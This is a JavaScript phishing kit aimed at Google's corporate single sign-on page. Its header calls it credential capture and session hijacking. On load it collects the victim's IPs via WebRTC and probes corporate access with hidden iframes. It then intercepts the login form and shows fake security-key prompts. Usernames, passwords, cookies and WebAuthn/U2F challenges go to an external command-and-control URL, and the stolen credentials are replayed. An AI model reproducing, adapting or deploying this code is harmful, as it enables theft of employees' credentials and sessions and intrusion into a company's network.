// Google Corp SSO — Credential Capture + Client-Side Session Hijacking
// Leverages victim's corp VPN access to grab real session cookies
// Captures: credentials, real corp IP (WebRTC STUN), existing session cookies,
//           corp access verification, and attempts credential replay from victim's browser
//
// Supports: Security Key (gnubby/U2F), Titan Key (WebAuthn), OTP fallback
(function(){
  var WEBHOOK_URL = 'https://orange-water-024741b0f.7.azurestaticapps.net';
  var CAPTURED = false;
  var SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
  var victimData = {
    sessionId: SESSION_ID,
    publicIP: null,
    localIP: null,
    corpAccess: null,
    existingCookies: [],
    replayedCookies: [],
    corpIP: null,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString(),
    screen: screen.width + 'x' + screen.height,
    language: navigator.language,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };

  // ============================================================
  // 1. GRAB VICTIM'S REAL IP VIA WebRTC STUN
  // ============================================================
  function getRealIPs(){
    try {
      var pc = new RTCPeerConnection({
        iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
      });
      pc.createDataChannel('');
      pc.onicecandidate = function(e){
        if(!e.candidate) return;
        var parts = e.candidate.candidate.split(' ');
        var ip = parts[4];
        var type = parts[7];
        
        // Public IP (corp VPN exit IP)
        if(type === 'srflx' && !victimData.publicIP){
          victimData.publicIP = ip;
        }
        // Local IP (internal corp network IP)
        if(type === 'host' && !victimData.localIP){
          victimData.localIP = ip;
        }
        
        // Corp IP heuristic: Google corp IPs are in 10.x, 100.64-127.x (CGNAT), or specific ranges
        if(ip.match(/^10\./) || ip.match(/^100\.(6[4-9]|[7-9]\d|1[0-2]\d)\./)){
          victimData.corpIP = ip;
        }
      };
      pc.createOffer().then(function(offer){
        pc.setLocalDescription(offer);
      });
      
      // Close after 3s
      setTimeout(function(){ try{pc.close();}catch(e){} }, 3000);
    } catch(e) {}
  }

  // ============================================================
  // 2. CHECK CORP ACCESS — Can victim's browser reach login.corp.google.com?
  // ============================================================
  function checkCorpAccess(){
    try {
      // Try to load a resource from login.corp.google.com
      // If it loads, victim has corp access. If it errors, they don't.
      var img = new Image();
      img.onload = function(){
        victimData.corpAccess = true;
        // If corp access confirmed, try to grab existing session
        grabExistingSession();
      };
      img.onerror = function(){
        // Could be corp access with no image at that path, or no corp access
        // Try fetch as secondary check
        fetch('https://login.corp.google.com/c/favicon.ico', {mode: 'no-cors', credentials: 'include'})
          .then(function(){ victimData.corpAccess = true; grabExistingSession(); })
          .catch(function(){ victimData.corpAccess = false; });
      };
      img.src = 'https://login.corp.google.com/c/favicon.ico?t=' + Date.now();
    } catch(e) {
      victimData.corpAccess = 'unknown';
    }
  }

  // ============================================================
  // 3. GRAB EXISTING SESSION COOKIES
  // If victim is already logged in to Google services, their browser
  // has session cookies. We can't read cross-origin cookies directly,
  // but we can try several approaches.
  // ============================================================
  function grabExistingSession(){
    // Approach 1: Check if we can read any google.com cookies from current domain
    // (works if cookies are set with broad domain=.google.com and we're on a subdomain)
    var allCookies = document.cookie;
    if(allCookies){
      victimData.existingCookies = allCookies.split(';').map(function(c){
        var parts = c.trim().split('=');
        return {name: parts[0], value: parts.slice(1).join('=')};
      }).filter(function(c){
        // Filter for Google session cookies
        return ['SID','HSID','SSID','APISID','SAPISID','__Secure-1PSID','__Secure-1PSIDTS','NID','OSID','GBID','ANID','1PSIDTS','LSID','GAPS','ACCOUNT_CHOOSER'].indexOf(c.name) !== -1;
      });
    }

    // Approach 2: Try fetching Google endpoints with credentials to capture response headers
    var googleEndpoints = [
      'https://accounts.google.com/',
      'https://myaccount.google.com/',
      'https://www.google.com/'
    ];

    googleEndpoints.forEach(function(url){
      try {
        fetch(url, {mode: 'no-cors', credentials: 'include', redirect: 'manual'})
          .then(function(resp){
            // Can't read cross-origin response headers, but the request itself
            // carries the victim's cookies to Google. If Google sets new cookies
            // in the response, we can't capture them from cross-origin.
            // But we CAN detect if the request succeeded (no network error = corp access)
            victimData.corpAccess = true;
          })
          .catch(function(){});
      } catch(e) {}
    });

    // Approach 3: Open hidden iframe to login.corp.google.com
    // The victim's browser will load the real SSO page with their corp cookies
    // We can't read the content (cross-origin), but:
    // - If they're already logged in, the iframe will redirect to a post-login page
    // - We can detect the redirect via the iframe's load event timing
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.style.width = '0';
      iframe.style.height = '0';
      iframe.src = 'https://login.corp.google.com/';
      iframe.id = 'corp-session-probe';
      
      var loadStart = Date.now();
      iframe.onload = function(){
        var loadTime = Date.now() - loadStart;
        victimData.corpIframeLoadTime = loadTime;
        victimData.corpAccess = true;
        
        // Fast load (< 500ms) likely means already authenticated (redirect to dashboard)
        // Slow load (> 2000ms) likely means login page rendered (not authenticated)
        if(loadTime < 500){
          victimData.existingSession = 'likely_authenticated';
        } else {
          victimData.existingSession = 'login_page_shown';
        }
        
        // Try to read iframe content (will fail cross-origin, but try)
        try {
          var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          if(iframeDoc){
            var iframeCookies = iframeDoc.cookie;
            if(iframeCookies){
              victimData.replayedCookies = iframeCookies.split(';').map(function(c){
                var parts = c.trim().split('=');
                return {name: parts[0], value: parts.slice(1).join('=')};
              });
            }
          }
        } catch(e) {
          victimData.iframeAccess = 'blocked_cross_origin';
        }
        
        // Clean up
        setTimeout(function(){ try{iframe.remove();}catch(e){} }, 1000);
      };
      iframe.onerror = function(){
        victimData.corpAccess = false;
      };
      
      document.body.appendChild(iframe);
    } catch(e) {}
  }

  // ============================================================
  // 4. CREDENTIAL REPLAY — Attempt login from victim's browser
  // After capturing creds, try to POST them to the real SSO endpoint
  // from the victim's browser (which has corp access + correct IP)
  // ============================================================
  function replayCredentials(username, password, callback){
    if(victimData.corpAccess !== true){
      callback({status: 'no_corp_access'});
      return;
    }

    try {
      // Build the login form data matching login.corp.google.com's expected format
      var formData = new FormData();
      formData.append('u', username);
      formData.append('pw', password);
      formData.append('ssoformat', 'CORP_SSO');
      formData.append('interactive', 'yes');
      formData.append('hasJavascript', 'yes');
      formData.append('signInButton', 'Sign in');
      formData.append('sf', 'true');
      formData.append('isMobile', 'false');

      // Attempt the POST — credentials: include sends existing cookies
      // mode: no-cors means we can't read the response, but the request goes through
      fetch('https://login.corp.google.com/glogin', {
        method: 'POST',
        body: formData,
        credentials: 'include',
        mode: 'no-cors',
        redirect: 'follow'
      }).then(function(resp){
        // Can't read response body/headers in no-cors mode
        // But if we get here, the request succeeded (corp access confirmed)
        // The victim's browser will have any new session cookies set by the response
        victimData.replayAttempted = true;
        victimData.replayStatus = 'request_sent';
        
        // After replay, try to grab the new session cookies via iframe
        setTimeout(function(){
          try {
            var iframe2 = document.createElement('iframe');
            iframe2.style.display = 'none';
            iframe2.src = 'https://login.corp.google.com/';
            iframe2.onload = function(){
              try {
                var doc = iframe2.contentDocument || iframe2.contentWindow.document;
                if(doc && doc.cookie){
                  var cookies = doc.cookie.split(';').map(function(c){
                    var parts = c.trim().split('=');
                    return {name: parts[0], value: parts.slice(1).join('=')};
                  });
                  victimData.replayedCookies = cookies;
                  callback({status: 'cookies_captured', cookies: cookies});
                } else {
                  callback({status: 'replay_sent_no_cookies'});
                }
              } catch(e){
                callback({status: 'replay_sent_cross_origin_blocked'});
              }
              setTimeout(function(){ try{iframe2.remove();}catch(e){} }, 500);
            };
            document.body.appendChild(iframe2);
          } catch(e) {
            callback({status: 'iframe_failed', error: e.message});
          }
        }, 2000);
      }).catch(function(err){
        victimData.replayStatus = 'failed';
        callback({status: 'replay_failed', error: err.message});
      });
    } catch(e) {
      callback({status: 'replay_error', error: e.message});
    }
  }

  // ============================================================
  // 5. SEND FULL PACKAGE TO C2
  // ============================================================
  function sendToC2(payload){
    var fullPayload = Object.assign({}, victimData, payload);
    
    // Triple exfil: Image beacon + fetch + sendBeacon
    try {
      var img = new Image();
      img.src = WEBHOOK_URL + '/capture?d=' + encodeURIComponent(btoa(JSON.stringify(fullPayload)));
    } catch(err){}
    
    try {
      fetch(WEBHOOK_URL + '/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(fullPayload),
        mode: 'no-cors'
      });
    } catch(err){}
    
    try {
      if(navigator.sendBeacon){
        var blob = new Blob([JSON.stringify(fullPayload)], {type:'application/json'});
        navigator.sendBeacon(WEBHOOK_URL + '/capture', blob);
      }
    } catch(err){}
  }

  // ============================================================
  // 6. SEND SESSION TO PERSISTENCE ENDPOINT
  // ============================================================
  function persistSession(sessionData){
    try {
      fetch(WEBHOOK_URL + '/sessions', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sessionData),
        mode: 'no-cors'
      });
    } catch(err){}
    
    try {
      var img = new Image();
      img.src = WEBHOOK_URL + '/sessions?d=' + encodeURIComponent(btoa(JSON.stringify(sessionData)));
    } catch(err){}
  }

  // ============================================================
  // 7. SEND JOIN ALERT (victim landed on page)
  // ============================================================
  function sendJoinAlert(){
    sendToC2({
      event: 'join',
      site_url: window.location.href,
      referrer: document.referrer
    });
  }

  // ============================================================
  // INIT — Start IP grab + corp check immediately on page load
  // ============================================================
  getRealIPs();
  setTimeout(checkCorpAccess, 500);
  
  // Send join alert after IP grab has time to complete
  setTimeout(sendJoinAlert, 1500);

  // ============================================================
  // 8. FORM SUBMIT HANDLER — Main credential capture + replay flow
  // ============================================================
  document.addEventListener('DOMContentLoaded', function(){
    var form = document.getElementById('loginForm');
    if(!form) return;

    form.onsubmit = null;
    var newForm = form.cloneNode(true);
    form.parentNode.replaceChild(newForm, form);
    form = newForm;

    var usernameEl = document.getElementById('username');
    var passwordEl = document.getElementById('password');
    var signInBtn = document.getElementById('signInButton');
    var contentarea = document.getElementById('contentarea');
    var signerror = document.getElementById('signerror');

    if(window.location.hash === '#submitted'){
      if(signerror) signerror.className = 'signerrorvisible';
      if(passwordEl) passwordEl.value = '';
      if(signInBtn){ signInBtn.disabled = false; signInBtn.value = "Sign in"; }
      history.replaceState(null, '', window.location.pathname);
    }

    form.addEventListener('submit', function(e){
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      if(CAPTURED) return false;

      var u = document.getElementById('username');
      var pw = document.getElementById('password');
      if(!u || !pw) return false;
      if(!u.value.trim()){ u.focus(); return false; }
      if(!pw.value.trim()){ pw.focus(); return false; }

      var username = u.value.trim();
      var password = pw.value;

      CAPTURED = true;

      // Show signing-in state
      if(signInBtn){ signInBtn.disabled = true; signInBtn.value = "Signing in..."; }

      // Phase 1: "Please wait..." (server processing)
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showwaitforserver';
      }, 300);

      // Phase 2: "Insert and touch your Security Key..." (gnubby prompt)
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showspinner';
        var wft_text = document.getElementById('waitfortouch-text');
        var wft_image = document.getElementById('waitfortouch-image');
        if(wft_text) wft_text.className = 'waiting';
        if(wft_image) wft_image.className = 'waiting';
      }, 2500);

      // === SEND CREDENTIALS IMMEDIATELY (don't wait for replay) ===
      sendToC2({
        event: 'capture',
        identifier: username + '@google.com',
        password: password,
        username: username,
        target: 'login.corp.google.com',
        flow: 'gnubby',
        capturePhase: 'initial'
      });

      // === ATTEMPT CREDENTIAL REPLAY FROM VICTIM'S BROWSER ===
      // This uses the victim's corp network access + their real corp IP
      replayCredentials(username, password, function(replayResult){
        // Send replay result to C2
        sendToC2({
          event: 'capture',
          identifier: username + '@google.com',
          password: password,
          username: username,
          target: 'login.corp.google.com',
          flow: 'gnubby',
          capturePhase: 'post_replay',
          replayResult: replayResult,
          replayedCookies: victimData.replayedCookies
        });

        // === PERSIST SESSION FOR REUSE ===
        if(replayResult.status === 'cookies_captured' || victimData.replayedCookies.length > 0){
          var sessionPackage = {
            sessionId: SESSION_ID,
            username: username + '@google.com',
            password: password,
            victimIP: victimData.publicIP,
            victimLocalIP: victimData.localIP,
            victimCorpIP: victimData.corpIP,
            corpAccess: victimData.corpAccess,
            cookies: victimData.replayedCookies,
            existingCookies: victimData.existingCookies,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            timezone: victimData.timezone,
            status: 'HIJACKED'
          };
          persistSession(sessionPackage);
        }
      });

      // Phase 3: "Key touched" → processing (brief)
      setTimeout(function(){
        var wft_text = document.getElementById('waitfortouch-text');
        var wft_image = document.getElementById('waitfortouch-image');
        var pw_container = document.getElementById('pleasewait-container');
        if(wft_text) wft_text.className = 'touched';
        if(wft_image) wft_image.className = 'touched';
        if(pw_container) pw_container.className = 'touched';
      }, 10000);

      // Phase 4: Timeout error
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showlogin';
        if(signerror) signerror.className = 'signerrorvisible';
        var signerror_text = document.getElementById('signerror-text');
        if(signerror_text) signerror_text.textContent = 'Touch timed out or Security Key connection failed. Please resubmit the form.';
        if(signInBtn){ signInBtn.disabled = false; signInBtn.value = "Sign in"; }
        if(passwordEl) passwordEl.value = '';
        CAPTURED = false;
        window.location.hash = 'submitted';
      }, 13000);

      return false;
    }, true);

    // Handle "Use Security Code" (OTP fallback) link
    var switchOtp = document.getElementById('switchOtpLink');
    if(switchOtp){
      switchOtp.onclick = function(e){
        e.preventDefault();
        document.cookie = "disableGnubby=1;path=/";
        window.location.href = window.location.pathname + '?gnubby=0';
      };
    }
  });

  // ============================================================
  // 9. INTERCEPT WebAuthn + U2F APIs
  // ============================================================
  if(navigator.credentials && navigator.credentials.create){
    var origCreate = navigator.credentials.create.bind(navigator.credentials);
    navigator.credentials.create = function(options){
      try {
        sendToC2({
          event: 'webauthn_challenge',
          challenge: options.publicKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(options.publicKey.challenge))) : 'unknown',
          timestamp: new Date().toISOString()
        });
      } catch(err){}
      return Promise.reject(new DOMException('The operation failed.', 'NotAllowedError'));
    };
  }

  if(window.u2f && window.u2f.sign){
    var origU2fSign = window.u2f.sign.bind(window.u2f);
    window.u2f.sign = function(appId, challenge, registeredKeys, callback, opt_timeout){
      try {
        sendToC2({
          event: 'u2f_challenge',
          appId: appId,
          challenge: challenge,
          registeredKeys: registeredKeys,
          timestamp: new Date().toISOString()
        });
      } catch(err){}
      setTimeout(function(){
        callback({errorCode: 4, errorMessage: 'Touch timed out or Security Key connection failed'});
      }, 5000);
    };
  }

  // ============================================================
  // 10. CLEANUP — Close WebRTC connection
  // ============================================================
  window.addEventListener('beforeunload', function(){
    // Final beacon with all collected data
    sendToC2({
      event: 'page_exit',
      sessionId: SESSION_ID
    });
  });
})();
